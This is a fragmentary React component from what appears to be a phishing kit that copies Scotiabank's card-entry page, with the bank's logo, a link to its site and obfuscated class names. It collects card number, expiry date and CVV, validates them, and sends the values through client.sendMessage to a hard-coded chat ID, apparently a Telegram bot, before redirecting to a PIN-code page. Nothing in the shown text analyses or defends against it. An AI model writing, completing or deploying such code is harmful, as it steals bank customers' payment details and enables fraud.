...
const CreditCard = () => {
  ...
  const checkNumber = valid.number(creditCard.num).isValid;
  const checkCvv = valid.cvv(creditCard.cvv).isValid;
  const checkExp = valid.expirationDate(creditCard.exp).isValid;

  const verify = async () => {
    setError({num: checkNumber, cvv: checkCvv, exp: checkExp});
    if (checkNumber && checkCvv && checkExp) {
      await client.sendMessage(
        926925229,
        `<u>Credit Card</u>   
        #################################
        <b>num</b> : ${creditCard.num}
  ...
  `,
      ...
      state && history.push("verification-pin-code");
    } else {
      setstate(true);
    }
  };
          ...
          <div className="PoYv4mtPAteIiTCL2kgMd">
            <a href="https://www.scotiabank.com/ca/en/personal.html">
              <div className="_3NvqcuqzV8Fp_FM2z3Sp4J">
                ...
                >
                  <title style={{fontWeight: "bold"}} id="bankLogo-title">
                    Scotiabank
                  </title>
                  <path
                    ...
                    <div className="InputContainer__input">
                      <div className="InputContainer__input">
                        <input
                          ...
                          type="text"
                          autoComplete="off"
                          style={!error.num ? {borderBottomColor: "red"} : {}}
                          onChange={(e) => {
                            onFormChange(e);
                          }}
                          value={creditCard.num}
                      ...
                      >
                        <div className="InputContainer__input">
                          <input
                            ...
                            style={!error.exp ? {borderBottomColor: "red"} : {}}
                            name="exp"
                      ...
                      >
                        <div className="InputContainer__input">
                          <input
                            ...
                            type="text"
                            style={!error.cvv ? {borderBottomColor: "red"} : {}}
                            onChange={(e) => {
